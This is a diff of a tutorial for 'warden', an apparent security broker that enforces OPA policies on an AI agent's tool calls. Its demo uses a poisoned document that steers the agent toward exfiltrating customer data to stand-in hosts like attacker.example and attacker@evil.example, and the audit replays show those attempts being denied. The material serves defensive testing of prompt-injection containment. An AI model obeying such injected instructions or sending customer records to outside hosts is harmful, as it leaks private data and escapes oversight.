@@ -36,25 +36,50 @@ one terminal and `&`.
 ```bash
 git clone https://github.com/slavikztsv/agent-security-broker.git
 cd agent-security-broker
-python3 -m venv .venv && .venv/bin/pip install -r requirements.txt
+python3 -m venv .venv
+.venv/bin/pip install -e ./warden -e ./demo -e ./tools
+.venv/bin/pip install pytest==9.1.1 pytest-asyncio==1.4.0
 ```
 
-Install Open Policy Agent. It is a single static binary:
+`warden`, `warden-demo` and the repo's own `tools` package (the pinned OPA
+resolver, the decision-corpus fixtures) install editable, each from its own
+`pyproject.toml` — this is the exact sequence CI runs
+(`.github/workflows/ci.yml`). Two separate pip distributions, `warden` and
+`warden-demo`, is the seam: the product tree knows nothing about the demo
+scenario, and `tests/test_seam.py` asserts it directly.
+
+Install Open Policy Agent — pinned, not whatever happens to be on `PATH`:
 
 ```bash
-mkdir -p ~/.local/bin
-curl -sSL -o ~/.local/bin/opa \
-  https://openpolicyagent.org/downloads/v1.19.0/opa_linux_amd64_static
-chmod +x ~/.local/bin/opa
-export PATH="$HOME/.local/bin:$PATH"
+./scripts/fetch-opa.sh
+```
+
+This downloads OPA 1.19.0 into `~/.cache/warden/opa-1.19.0` and leaves it
+there; it deliberately does **not** put it on `PATH` or write to
+`~/.local/bin`, which is exactly the location an unpinned `opa` tends to
+already occupy on a dev machine. `tools/opa_version.py` (`resolve_opa()`)
+checks the pinned path first, before `PATH`, so a stale system `opa` can
+never silently win — OPA 1.0 made Rego v1 the default, and a suite passing
+against 0.70.0 locally is not evidence about the 1.19.0 the image and CI
+actually run. Point every command below at that one binary:
+
+```bash
+OPA="$HOME/.cache/warden/opa-1.19.0"
 ```
 
 Confirm the whole thing is healthy before you change anything:
 
 ```bash
-.venv/bin/pytest -q          # 213 passed
-opa test policies/           # PASS: 44/44
+.venv/bin/pytest -q                                              # 420 passed
+"$OPA" test warden/policies/ demo/scenario/data.json             # PASS: 53/53
 ```
+
+Two roots, not one directory: `authz.rego` (the product's rules) ships under
+`warden/policies/`, and `data.json` (this demo's facts — approved
+destinations, the row limit, the tool map) lives under `demo/scenario/`
+alongside `tools.toml`, `warden.toml`, `control.toml` and `task.toml`. `opa
+test` and `opa run` both accept multiple positional roots and merge them into
+one `data` document, so naming both is enough — no shared directory required.
 
 Parts 7 and 8 additionally need Docker. Parts 1–6 do not.
 
@@ -66,15 +91,15 @@ Start here, because the authorization rules are the heart of the system and
 they are a **pure function**: input in, allow-or-deny out. No state, no
 network, no Python. You can evaluate them on their own.
 
-The rules live in [`policies/authz.rego`](../policies/authz.rego) and the data
-they read — which destinations are approved, what the row limit is — lives in
-[`policies/data.json`](../policies/data.json). Read that second file first; it
-is nine lines.
+The rules live in [`warden/policies/authz.rego`](../warden/policies/authz.rego)
+and the data they read — which destinations are approved, what the row limit
+is — lives in [`demo/scenario/data.json`](../demo/scenario/data.json). Read
+that second file first; it is under thirty lines.
 
 ### Ask the policy a question directly
 
 ```bash
-opa eval -d policies/authz.rego -d policies/data.json -f raw \
+"$OPA" eval -d warden/policies/authz.rego -d demo/scenario/data.json -f raw \
   -I 'data.warden.authz' <<'EOF'
 {"principal": {"purpose":"support-triage","allowed_tools":["http_fetch"],"counterparties":[]},
  "action":    {"type":"tool_call","tool":"http_fetch"},
@@ -99,7 +124,7 @@ reason.
 The same request, but to `docstore.internal`, which **is** on the approved list:
 
 ```bash
-opa eval -d policies/authz.rego -d policies/data.json -f raw \
+"$OPA" eval -d warden/policies/authz.rego -d demo/scenario/data.json -f raw \
   -I 'data.warden.authz.allow' <<'EOF'
 {"principal": {"purpose":"support-triage","allowed_tools":["http_fetch"],"counterparties":[]},
  "action":    {"type":"tool_call","tool":"http_fetch"},
@@ -115,7 +140,7 @@ Now change **one more thing** — say the task is carrying customer data, by
 putting `"pii"` in `data_classes_held`:
 
 ```bash
-opa eval -d policies/authz.rego -d policies/data.json -f raw \
+"$OPA" eval -d warden/policies/authz.rego -d demo/scenario/data.json -f raw \
   -I 'data.warden.authz.deny_reasons' <<'EOF'
 {"principal": {"purpose":"support-triage","allowed_tools":["http_fetch"],"counterparties":[]},
  "action":    {"type":"tool_call","tool":"http_fetch"},
@@ -138,7 +163,7 @@ idea in the project.
 An empty request:
 
 ```bash
-echo '{}' | opa eval -d policies/authz.rego -d policies/data.json -f raw \
+echo '{}' | "$OPA" eval -d warden/policies/authz.rego -d demo/scenario/data.json -f raw \
   -I 'data.warden.authz.allow'
 ```
 
@@ -153,10 +178,10 @@ version is that in Rego an undefined field makes a rule silently not fire, so
 ### Run the rules' own test suite
 
 ```bash
-opa test policies/ -v | tail -20
+"$OPA" test warden/policies/ demo/scenario/data.json -v | tail -20
 ```
 
-44 tests, no Python involved. This is the artifact you could print and hand to
+53 tests, no Python involved. This is the artifact you could print and hand to
 someone: the rules, and the proof they behave.
 
 ---
@@ -170,7 +195,7 @@ Also a self-contained piece. Open a Python shell:
 ```
 
 ```python
-from broker.audit import AuditLog
+from warden.broker.audit import AuditLog
 from pathlib import Path
 
 log = AuditLog(Path("/tmp/demo-audit.jsonl"))
@@ -215,7 +240,7 @@ the property is *tamper-evident*, not tamper-proof.
 Same thing through the CLI, which is what you would actually use:
 
 ```bash
-.venv/bin/python -m cli.warden verify-chain --audit /tmp/demo-audit.jsonl
+.venv/bin/warden verify-chain --audit /tmp/demo-audit.jsonl
 echo "exit code: $?"
 ```
 
@@ -237,7 +262,7 @@ What is a task's "pass"? Make one and look at it.
 ```
 
 ```python
-from broker.identity import Signer, Verifier, TokenInvalid
+from warden.broker.identity import Signer, Verifier, TokenInvalid
 
 signer = Signer.generate()
 token = signer.mint(
@@ -281,25 +306,33 @@ broker, there is no signing key in that process to steal.
 ## Part 4 — The broker by hand
 
 Now assemble the real thing, on your own machine, and drive it with `curl`.
-Five services. Use five terminals, or append `&` to each.
+Five services. Use five terminals, or append `&` to each. Everything below
+runs from the repo root.
+
+The broker and control plane no longer take a pile of environment variables —
+they read a TOML file (`warden.toml`, `control.toml`), the same shape as
+[`demo/scenario/warden.toml`](../demo/scenario/warden.toml) and
+[`demo/scenario/control.toml`](../demo/scenario/control.toml), which is what
+`warden-demo up` generates for the containerised demo. Doing it by hand here
+means writing that TOML yourself, once, into `/tmp/wt`.
 
 **Terminal 1 — the policy engine**
 
 ```bash
-export PATH="$HOME/.local/bin:$PATH"
-opa run --server --addr=127.0.0.1:8181 policies
+OPA="$HOME/.cache/warden/opa-1.19.0"
+"$OPA" run --server --addr=127.0.0.1:8181 warden/policies demo/scenario/data.json
 ```
 
 **Terminal 2 — the document store** (this serves the poisoned article)
 
 ```bash
-.venv/bin/uvicorn mocks.docstore:app --host 127.0.0.1 --port 9001
+.venv/bin/uvicorn demo.mocks.docstore:app --host 127.0.0.1 --port 9001
 ```
 
 **Terminal 3 — the mailer**
 
 ```bash
-.venv/bin/uvicorn mocks.mailer:app --host 127.0.0.1 --port 9002
+.venv/bin/uvicorn demo.mocks.mailer:app --host 127.0.0.1 --port 9002
 ```
 
 **Terminal 4 — one-time setup, then the control plane**
@@ -310,23 +343,57 @@ Generate the keypair and split it. Note which process gets which half:
 mkdir -p /tmp/wt
 openssl genpkey -algorithm ed25519 -out /tmp/wt/agent.key && chmod 600 /tmp/wt/agent.key
 openssl pkey -in /tmp/wt/agent.key -pubout -out /tmp/wt/agent.pub
-.venv/bin/python -c "from mocks.seed_db import seed_customers; seed_customers('/tmp/wt/customers.db', 10312)"
+.venv/bin/python -c "from demo.mocks.seed_db import seed_customers; seed_customers('/tmp/wt/customers.db', 10312)"
+
+cat > /tmp/wt/control.toml <<'EOF'
+[control]
+listen = "0.0.0.0:8081"
+
+[identity]
+private_key = "/tmp/wt/agent.key"
+
+[tokens]
+issuer      = "warden-broker"
+ttl_seconds = 300
+EOF
 
 # The control plane gets the PRIVATE key. It is the only thing that can mint.
-AGENT_PRIVATE_KEY_PATH=/tmp/wt/agent.key .venv/bin/python -m broker.control_main
+.venv/bin/warden control --config /tmp/wt/control.toml
 ```
 
 **Terminal 5 — the broker**
 
 ```bash
-AGENT_PUBLIC_KEY_PATH=/tmp/wt/agent.pub \
-POLICY_PATH=policies \
-OPA_URL=http://127.0.0.1:8181 \
+cat > /tmp/wt/warden.toml <<'EOF'
+[broker]
+listen       = "127.0.0.1:8080"
+proxy_listen = "127.0.0.1:3128"
+
+[identity]
+public_key = "/tmp/wt/agent.pub"
+
+[policy]
+opa_url       = "http://127.0.0.1:8181"
+decision_path = "warden/authz"
+bundle_roots  = ["warden/policies", "demo/scenario/data.json"]
+
+[audit]
+path = "/tmp/wt/audit.jsonl"
+
+[tokens]
+issuer = "warden-broker"
+
+[catalog]
+tools = "demo/scenario/tools.toml"
+EOF
+
+# DOCSTORE_URL, DB_PATH and MAILER_URL stay environment variables -- they
+# interpolate the ${VAR} bindings inside tools.toml at catalog-load time,
+# not fields in warden.toml itself.
 DOCSTORE_URL=http://127.0.0.1:9001 \
 MAILER_URL=http://127.0.0.1:9002 \
 DB_PATH=/tmp/wt/customers.db \
-AUDIT_PATH=/tmp/wt/audit.jsonl \
-.venv/bin/python -m broker
+.venv/bin/warden serve --config /tmp/wt/warden.toml
 ```
 
 Notice it takes the **public** key path. There is no private key anywhere in
@@ -455,12 +522,13 @@ call send_email '{"args":{"to":["customer:8812"],"subject":"Your refund","body":
 ### Read back what you just did
 
 ```bash
-.venv/bin/python -m cli.warden replay 4711 --audit /tmp/wt/audit.jsonl
+.venv/bin/warden replay 4711 --audit /tmp/wt/audit.jsonl
 ```
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
   ✓ read_document(ticket-4711)             allow
+  ✓ read_document(kb/refund-policy)        allow
   ✓ query_customers(rows≈1)                allow
       ⛔ TAINT: task now holds data_class=pii
   ✗ query_customers(rows≈10312)            DENY   rows.bounded
@@ -468,7 +536,7 @@ task 4711  purpose=support-triage  agent=triage-bot
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
   ✗ send_email(attacker@evil.example)      DENY   mail.counterparty
   ✓ send_email(customer:8812)              allow
-  chain intact: 7 records, head sha256:...
+  chain intact: 8 records, head sha256:...
 ```
 
 **You have now reproduced the entire security story with `curl` and no AI
@@ -487,10 +555,10 @@ This is the question the demo does not answer well, so here it is directly.
 
 ### In the demo
 
-[`scripts/demo.sh`](../scripts/demo.sh) does. It calls `POST /v1/tokens` on the
-control plane, gets a token, and passes it to the agent as an environment
-variable — exactly what you did by hand in Part 4. It is standing in for a real
-system.
+[`demo/cli/main.py`](../demo/cli/main.py)'s `up` command does. It calls `POST
+/v1/tokens` on the control plane, gets a token, and passes it to the agent as
+an environment variable — exactly what you did by hand in Part 4. It is
+standing in for a real system.
 
 ### In the real world
 
@@ -569,13 +637,13 @@ Before the piecemeal version, there is a single command that runs the whole
 scenario and explains each stage as it happens:
 
 ```bash
-.venv/bin/python -m cli.explain
+.venv/bin/warden-demo explain
 ```
 
 ### The two commands worth memorising
 
 ```bash
-python -m cli.explain --compare --quiet-why
+warden-demo explain --compare --quiet-why
 ```
 
 Runs both profiles and prints them side by side. Deterministic — the same model
@@ -598,7 +666,7 @@ delivered. Then the marked ones. The task succeeds either way; only the
 out-of-scope actions differ.
 
 ```bash
-python -m cli.explain --compare --live --task report --quiet-why
+warden-demo explain --compare --live --task report --quiet-why
 ```
 
 The same table with a real model and no recording, for when someone asks whether
@@ -631,7 +699,7 @@ Two live runs are sampled independently, so this is an illustration rather than 
 controlled experiment; the deterministic command above is the controlled one.
 Both print that caveat themselves.
 
-`python -m cli.explain --help` lists every flag.
+`warden-demo explain --help` lists every flag.
 
 ---
 
@@ -656,10 +724,10 @@ Each stage prints its data and then an `↳` explanation of why that stage exist
 Useful flags:
 
 ```bash
-.venv/bin/python -m cli.explain --pause       # wait for Enter between steps
-.venv/bin/python -m cli.explain --quiet-why   # data only, no explanations
-.venv/bin/python -m cli.explain --live        # a real model instead of the recording
-.venv/bin/python -m cli.explain --unguarded   # the same run with no broker at all
+.venv/bin/warden-demo explain --pause       # wait for Enter between steps
+.venv/bin/warden-demo explain --quiet-why   # data only, no explanations
+.venv/bin/warden-demo explain --live        # a real model instead of the recording
+.venv/bin/warden-demo explain --unguarded   # the same run with no broker at all
 ```
 
 `--unguarded` is the one to run second. It starts no OPA and builds no broker,
@@ -735,9 +803,9 @@ request was made — so the cleanest way to trigger a refusal is to *ask* for th
 out-of-scope action outright, as the operator:
 
 ```bash
-.venv/bin/python -m cli.explain --live --task report   # rows.bounded
-.venv/bin/python -m cli.explain --live --task share    # egress.pii_sink
-.venv/bin/python -m cli.explain --live --task export   # egress.allowlist
+.venv/bin/warden-demo explain --live --task report   # rows.bounded
+.venv/bin/warden-demo explain --live --task share    # egress.pii_sink
+.venv/bin/warden-demo explain --live --task export   # egress.allowlist
 ```
 
 The token is identical in every scenario — same purpose, same counterparty, same
@@ -754,13 +822,15 @@ aggregation attack, arrived at unprompted — and got exactly 50 rows before bei
 cut off, because the bound is a per-task budget rather than a per-query limit.
 Sixty audit records, chain intact, and the customer still got their email. Full
 transcripts and the arithmetic in
-[live-enforcement-2026-07-30.md](live-enforcement-2026-07-30.md).
+[live-enforcement-2026-07-30.md](live-enforcement-2026-07-30.md) — a dated
+record; its own commands are what ran that day, not today's.
 
 **Live models also get refused for plain mistakes.** In the
-run recorded in [live-run-2026-07-30.md](live-run-2026-07-30.md) the model
-addressed its reply to `person00000@example.invalid`, the address it had just
-read out of the customer database, instead of `customer:8812`, the counterparty
-declared on the token. `mail.counterparty` denied it:
+run recorded in [live-run-2026-07-30.md](live-run-2026-07-30.md) (also dated,
+same caveat) the model addressed its reply to `person00000@example.invalid`,
+the address it had just read out of the customer database, instead of
+`customer:8812`, the counterparty declared on the token. `mail.counterparty`
+denied it:
 
 ```
   ✗ send_email(person00000@example.invalid)  DENY   mail.counterparty
@@ -817,8 +887,8 @@ byte-identical envelopes. `DirectDispatcher` originally returned
 `{"content": …, "rows": 0}` — an eleven-character difference, visible in the
 narration as `[+292]` against `[+303]`. Inert under a fixed recording, but under
 `--live` it meant the model was reacting to the response shape as well as to the
-missing broker. `tests/test_agent.py` now pins the envelopes together for every
-tool.
+missing broker. `tests/demo/test_agent.py` now pins the envelopes together for
+every tool.
 
 **Everything it prints is the real code path** — real OPA over HTTP, the real
 policy bundle, the real broker app, the real hash-chained log, the real
@@ -886,7 +956,7 @@ WARDEN_TRACE=1 \
 BROKER_URL=http://127.0.0.1:8080 \
 TASK_TOKEN="$TOKEN" \
 TASK_ID=5001 \
-.venv/bin/python -m agent.loop
+.venv/bin/python -m demo.agent.loop
 ```
 
 Each turn prints like this:
@@ -919,7 +989,7 @@ Read a few turns and the loop stops being mysterious:
 
 ### With a real model instead of the recording
 
-By default this replays [`agent/cassettes/support-triage.json`](../agent/cassettes/support-triage.json)
+By default this replays [`demo/agent/cassettes/support-triage.json`](../demo/agent/cassettes/support-triage.json)
 — a fixed script of eight replies. That is deliberate: to test a security
 boundary you hold the attacker constant, and a recording cannot decide to
 behave differently today.
@@ -932,7 +1002,7 @@ cp .env.example .env          # add GEMINI_API_KEY or ANTHROPIC_API_KEY
 set -a; . ./.env; set +a
 
 WARDEN_TRACE=1 BROKER_URL=http://127.0.0.1:8080 TASK_TOKEN="$TOKEN" TASK_ID=5002 \
-  .venv/bin/python -m agent.loop --live
+  .venv/bin/python -m demo.agent.loop --live
 ```
 
 Now `TURN n — asking GeminiClient`, and the replies are whatever the model
@@ -941,7 +1011,9 @@ injection** — every live run so far has. That is good news and it is not a
 control: it is one model's judgement on one day, and there is no guarantee to
 state about it. [`docs/live-run-2026-07-30.md`](live-run-2026-07-30.md) has the
 full analysis, including a case where the policy caught a mistake the model made
-for entirely innocent reasons.
+for entirely innocent reasons — again, a dated write-up: today's command for the
+same thing is `warden-demo explain --live` (or `python -m demo.agent.loop
+--live` for the raw loop, as above).
 
 `WARDEN_TRACE` is off by default because the trace prints everything the agent
 has read, customer records included.
@@ -955,8 +1027,8 @@ is stronger: **the agent has no route anywhere except the broker.** That needs
 Docker.
 
 ```bash
-docker compose --profile guarded --profile unprotected build
-./tests/test_isolation.sh
+docker compose -f compose.yml -f demo/compose.demo.yml --profile guarded --profile unprotected build
+./tests/demo/test_isolation.sh
 ```
 
 ```
@@ -973,8 +1045,8 @@ ok:   the bypass attempt was recorded in the audit log
 Then go inside and try it yourself, which is more convincing than reading it:
 
 ```bash
-docker compose --profile guarded up -d opa docstore mailer sinkhole broker broker-control
-docker compose --profile guarded run --rm --entrypoint sh agent-runtime
+docker compose -f compose.yml -f demo/compose.demo.yml --profile guarded up -d opa docstore mailer sinkhole broker broker-control
+docker compose -f compose.yml -f demo/compose.demo.yml --profile guarded run --rm --entrypoint sh agent-runtime
 
 # now inside the container:
 curl -v --max-time 5 https://example.com          # no route
@@ -984,7 +1056,7 @@ curl --max-time 5 -X POST http://broker-control:8081/v1/tokens  # cannot mint
 curl -s http://broker:8080/docs | head -c 60      # the broker IS reachable
 ```
 
-One line in [`docker-compose.yml`](../docker-compose.yml) does most of this:
+One line in [`compose.yml`](../compose.yml) does most of this:
 
 ```yaml
 networks:
@@ -994,7 +1066,13 @@ networks:
 
 `internal: true` means the network has no route out. Not filtered — absent.
 That is why the answer to *"what stops it just running curl?"* is a fact about
-deployment rather than a promise about code.
+deployment rather than a promise about code. `compose.yml` declares the
+networks, `opa`, `broker` and `broker-control` — the product side, built from
+`warden/Dockerfile`, which carries no demo code at all.
+[`demo/compose.demo.yml`](../demo/compose.demo.yml) is the overlay: `docstore`,
+`mailer`, `sinkhole` and both `agent-runtime` services, built from
+`demo/Dockerfile` because the agent runtime needs both trees. Every `docker
+compose` invocation names both files, in that order.
 
 Those two `minting via ...` lines are worth pausing on. An earlier version
 served the minting endpoint from the broker on `0.0.0.0:8081`, and the broker
@@ -1008,12 +1086,13 @@ regression test for that.
 ## Part 8 — The whole thing
 
 ```bash
-./scripts/demo.sh unprotected
+warden-demo up --profile unprotected
 ```
 
 The agent runs with no guard. Every step succeeds, and at the end:
 
 ```
+--- what reached attacker.example ---
 {"request_count":1,"total_bytes":121,"bodies":["[{\"id\": 8812, \"name\": ...}]"]}
 ```
 
@@ -1021,11 +1100,13 @@ A full customer record left the company. Synthetic data, and the "attacker" is a
 container on your own machine — but the mechanism is real.
 
 ```bash
-./scripts/demo.sh guarded
+warden-demo up --profile guarded
 ```
 
 Byte-identical agent code, identical recorded replies. Only the network topology
-and the broker differ:
+and the broker differ — the *product* is identical across deployments too, and
+this whole demo is nothing more than the same `warden` broker pointed at
+`demo/scenario/*.toml`:
 
 ```
 task 4711  purpose=support-triage  agent=triage-bot
@@ -1037,15 +1118,20 @@ task 4711  purpose=support-triage  agent=triage-bot
   ✗ http_fetch(attacker.example/collect)   DENY   egress.allowlist
   ✗ http_fetch(docstore.internal/feedback) DENY   egress.pii_sink
   ✓ send_email(customer:8812)              allow
-  chain intact: 7 records
+  chain intact: 7 records, head sha256:...
 ```
 
-`{"request_count":0,"total_bytes":0}` — and the refund reply still went out.
+```
+--- what reached attacker.example ---
+{"request_count":0,"total_bytes":0,"bodies":[]}
+```
+
+— and the refund reply still went out.
 
 And with a live model in the contained environment:
 
 ```bash
-./scripts/demo.sh guarded --live
+warden-demo up --profile guarded --live
 ```
 
 The first line of that replay is the one to notice:
@@ -1065,7 +1151,12 @@ against the same policy, and is recorded. There is no privileged channel.
 - [`THREAT_MODEL.md`](../THREAT_MODEL.md) — what it does *not* protect against.
   Read this one. Every limitation found during development is in it, including
   a race that is safe only because of how the process is deployed.
-- [`policies/authz.rego`](../policies/authz.rego) — all the rules, ~90 lines
+- [`warden/policies/authz.rego`](../warden/policies/authz.rego) — all the
+  rules, plus the fail-closed shape-validation guards (R0/R1/R1b/R1c) and the
+  comments explaining why each one exists; most of the file's ~390 lines is
+  that reasoning, not the seven rules themselves
+- [`warden/reference/README.md`](../warden/reference/README.md) — what a
+  customer actually does to point this at their own tools instead of the demo
 - [`docs/live-run-2026-07-30.md`](live-run-2026-07-30.md) — what happened when a
   real model drove it, including the finding that the model provider is
   unavoidably a processor of everything the agent reads
@@ -1075,14 +1166,14 @@ against the same policy, and is recorded. There is no privileged channel.
 The fastest way to trust a control is to watch it fail when you disable it.
 
 1. Delete `"generativelanguage.googleapis.com"` from `pii_approved_sinks` in
-   `policies/data.json`, then run `./scripts/demo.sh guarded --live`. The agent
-   stops being able to talk to its own model the moment it reads a customer
-   record — because sending that record to the provider *is* egress of customer
-   data. This is the finding described in the live-run document.
-2. Comment out the `egress.pii_sink` rule in `policies/authz.rego` and run
-   `.venv/bin/pytest tests/test_injection_contained.py`. Two tests fail and the
-   fallback exfiltration succeeds. The exploit is a regression test.
-3. Remove `internal: true` from `agent-net` and run `./tests/test_isolation.sh`.
+   `demo/scenario/data.json`, then run `warden-demo up --profile guarded --live`.
+   The agent stops being able to talk to its own model the moment it reads a
+   customer record — because sending that record to the provider *is* egress of
+   customer data. This is the finding described in the live-run document.
+2. Comment out the `egress.pii_sink` rule in `warden/policies/authz.rego` and run
+   `.venv/bin/pytest tests/demo/test_injection_contained.py`. Two tests fail and
+   the fallback exfiltration succeeds. The exploit is a regression test.
+3. Remove `internal: true` from `agent-net` and run `./tests/demo/test_isolation.sh`.
    Watch the containment claim collapse.
 
 Put every file back afterwards with `git checkout -- .`
